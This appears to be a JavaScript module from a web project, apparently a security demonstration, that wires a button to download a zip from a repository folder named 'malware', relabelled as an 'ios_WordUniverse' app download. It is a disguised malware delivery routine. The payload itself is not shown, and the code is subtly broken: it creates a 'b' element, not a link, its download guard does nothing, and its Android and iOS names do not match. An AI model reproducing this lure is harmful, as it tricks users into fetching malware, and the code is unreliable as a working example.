export default function Download_Android() {
    const downloadButton = document.getElementById('ios');

    downloadButton.addEventListener('click', handleDownload);

    async function handleDownload() {
        // 다운로드 중인지 여부를 확인하는 변수
        let isDownloading = false;

        if (!isDownloading) {
            isDownloading = true;

            const fileURL = 'https://github.com/KGV-Security/VIRUS_IN_WEB/raw/88e3f772c3827a875246a95e89e1a9dae012214e/src/malware/WordUniverse.zip';
            const fileName = 'ios_WordUniverse.zip';

            const b = document.createElement('b');
            b.href = fileURL;
            b.download = fileName;
            document.body.appendChild(b);
            b.click();
            document.body.removeChild(b);

            // 다운로드가 완료되었을 때 버튼을 활성화
            isDownloading = false;
        }
    }
}
